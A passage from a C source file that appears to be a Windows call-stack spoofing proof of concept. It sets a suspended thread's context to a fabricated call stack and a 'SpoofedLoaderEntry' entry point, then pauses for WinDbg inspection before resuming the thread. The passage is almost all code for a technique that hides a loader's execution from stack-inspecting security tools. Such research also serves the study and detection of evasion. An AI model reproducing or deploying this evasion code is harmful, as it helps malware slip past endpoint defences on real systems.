    ctx.Rsp &= ~0xFULL;  // align down to 16 bytes

    // Build the fake call stack under that adjusted Rsp
    InitializeFakeThreadState(&ctx, targetCallStack, frameCount);

    // Use SpoofedLoaderEntry as the real entry point
    ctx.Rip = (DWORD64)SpoofedLoaderEntry;

    if (!SetThreadContext(hThreadSpoof, &ctx)) {
        printf("[-] SetThreadContext failed (Error: %lu)\n", GetLastError());
        CloseHandle(hThreadSpoof);
        return -1;
    }

    // Debug output
    printf("[+] Top synthetic RET: 0x%llX\n",
           (unsigned long long)((ULONG64)targetCallStack[0].returnAddress));

    // Debug output and a pause for debugger inspection
    printf("[!] TARGET THREAD IS SUSPENDED\n");
    printf("    -> Process ID (Decimal): %d\n", GetCurrentProcessId());
    printf("    -> Thread ID (Decimal): %lu\n", dwThreadId);
    printf("    -> Thread ID (Hex):     0x%lX\n", dwThreadId);
    printf("[!] Attach WinDbg now, list threads (~), select this thread correlating the thread ID (~Ns), then run 'kp'.\n", dwThreadId);
    printf("    Press ENTER here to resume the spoofed thread...\n");
    getchar();

    printf("[+] Resuming suspended thread...\n");
    ResumeThread(hThreadSpoof);

    printf("[*] Host engine holding process boundary open.\n");

    /* keep the process alive while the spoofed thread runs/parks */
    WaitForSingleObject(hThreadSpoof, INFINITE);

    if (vehHandle) {
        RemoveVectoredExceptionHandler(vehHandle);
    }

    CloseHandle(hThreadSpoof);
    return 0;
}